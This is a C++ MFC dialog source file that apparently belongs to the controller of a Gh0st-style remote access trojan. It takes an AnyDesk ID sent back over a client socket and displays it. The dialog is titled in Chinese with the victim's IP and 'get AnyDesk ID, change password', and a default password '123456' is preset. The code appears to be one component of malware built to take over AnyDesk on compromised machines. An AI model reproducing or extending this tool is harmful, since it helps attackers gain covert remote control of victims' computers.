// ChromeDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "AnyDeskDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAnyDeskDlg dialog


CAnyDeskDlg::CAnyDeskDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CAnyDeskDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CAnyDeskDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT

	m_edit_akmm = "123456";
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	m_AnyDesk_text = m_pContext->m_DeCompressionBuffer.GetBuffer(1);

}


void CAnyDeskDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAnyDeskDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	DDX_Control(pDX,IDC_EDIT_AKID ,m_edit_akid);
	DDX_Text(pDX, IDC_EDIT_AKMM, m_edit_akmm);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CAnyDeskDlg, CDialog)
	//{{AFX_MSG_MAP(CAnyDeskDlg)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CAnyDeskDlg message handlers

BOOL CAnyDeskDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
		// 设置标题
	CString str;
	str.Format("\\\\%s - 获取AnyDesk ID 修改密码",m_IPAddress);
	SetWindowText(str);

	m_edit_akid.SetWindowText(m_AnyDesk_text);
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}
